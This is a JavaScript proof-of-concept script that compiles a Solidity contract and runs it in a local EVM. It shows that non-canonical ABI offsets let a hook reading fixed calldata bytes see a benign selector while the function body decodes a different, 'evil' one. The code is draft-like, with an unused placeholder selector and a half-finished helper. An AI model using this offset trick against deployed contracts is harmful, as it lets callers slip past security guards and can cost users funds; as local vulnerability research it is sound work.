import solc from "solc";
import fs from "fs";
import { createEVM } from "@ethereumjs/evm";
import { hexToBytes, bytesToHex, Address } from "@ethereumjs/util";

const src = fs.readFileSync("Diff.sol","utf8");
const input = { language:"Solidity", sources:{ "Diff.sol":{content:src} },
  settings:{ outputSelection:{ "*":{ "*":["abi","evm.bytecode.object","evm.deployedBytecode.object"] } }, optimizer:{enabled:true,runs:200} } };
const out = JSON.parse(solc.compile(JSON.stringify(input)));
if (out.errors) for (const e of out.errors) if (e.severity==="error") { console.error(e.formattedMessage); process.exit(1); }
const c = out.contracts["Diff.sol"]["Diff"];
const bytecode = "0x"+c.evm.bytecode.object;

const evm = await createEVM();
const caller = new Address(hexToBytes("0x"+"11".repeat(20)));
const create = await evm.runCall({ caller, data: hexToBytes(bytecode), gasLimit: 5_000_000n });
const addr = create.createdAddress;

const SEL = "0x12345678"; // execute() selector placeholder (we call raw, selector not checked by our fn dispatch? need real selector)
// compute real selector of execute(address,uint256,bytes)
import { keccak256 } from "ethereum-cryptography/keccak.js";
import { utf8ToBytes } from "ethereum-cryptography/utils.js";
const execSel = "0x"+Buffer.from(keccak256(utf8ToBytes("execute(address,uint256,bytes)"))).toString("hex").slice(0,8);

const target = "00".repeat(12) + "22".repeat(20); // 32-byte word, address in low 20
const BENIGN = "aaaaaaaa";   // what a fixed-offset hook would read at [132:136]
const EVIL   = "deadbeef";   // what the body's decoder should read if offset is followed

function word(hex){ return hex.padStart(64,"0"); }
function callData(offsetHex, layout){
  // selector + target + value + offset + <layout bytes>
  return "0x"+execSel.slice(2) + word(target.slice(-64)==target?target:target) ;
}

// Build canonical calldata (offset = 0x60): hook and body must agree.
function build(offset, benignAt132, realDataSelector, shiftedContentWordIndexFrom100){
  // head
  let hd = execSel.slice(2);
  hd += word(target);                 // target (already 64 hex)
  hd += word("");                     // value = 0
  hd += word(offset.toString(16));    // offset to bytes
  // After head (ends at byte 100 = hex index 200 incl selector? selector=4B=8hex, each word 32B=64hex)
  // positions (in bytes, from start of calldata incl selector):
  //  [0:4] sel, [4:36] target, [36:68] value, [68:100] offset
  // Now we append words. We'll place:
  //  word at [100:132]  (canonical length slot)
  //  word at [132:164]  (canonical content slot; its first 4 bytes = [132:136] hook reads)
  //  word at [164:196]  (if offset=0xA0, this is the REAL length slot)
  //  word at [196:228]  (REAL content; first 4 bytes = real selector)
  // canonical content word: put benign selector in first 4 bytes
  const canonContent = benignAt132.padEnd(64,"0");
  // real length (=4) and real content with the evil selector
  const realLen = word((4).toString(16));
  const realContent = realDataSelector.padEnd(64,"0");
  hd += word((4).toString(16)); // [100:132] canonical length = 4 (used if offset==0x60)
  hd += canonContent;           // [132:164] canonical content (hook reads [132:136])
  hd += realLen;                // [164:196]
  hd += realContent;            // [196:228]
  return "0x"+hd;
}

async function call(data){
  const r = await evm.runCall({ caller, to: addr, data: hexToBytes(data), gasLimit: 2_000_000n });
  const rv = bytesToHex(r.execResult.returnValue);
  // returns (bytes4 hookSelector, bytes4 bodySelector): two 32B words, selector in high 4 bytes
  const hookSel = rv.slice(2, 10);
  const bodySel = rv.slice(66, 74);
  return { hookSel, bodySel, exc: r.execResult.exceptionError?.error };
}

// CANONICAL: offset 0x60 -> body reads [132:136] too (length at [100:132]=4, content [132:])
const canon = build(0x60, BENIGN, BENIGN);
// NON-CANONICAL: offset 0xA0 -> body reads length at [164:196], content at [196:]=EVIL;
//   hook still reads fixed [132:136]=BENIGN
const evil  = build(0xA0, BENIGN, EVIL);

console.log("execute selector:", execSel);
console.log("CANONICAL (offset 0x60):", await call(canon));
console.log("NON-CANONICAL (offset 0xA0):", await call(evil));
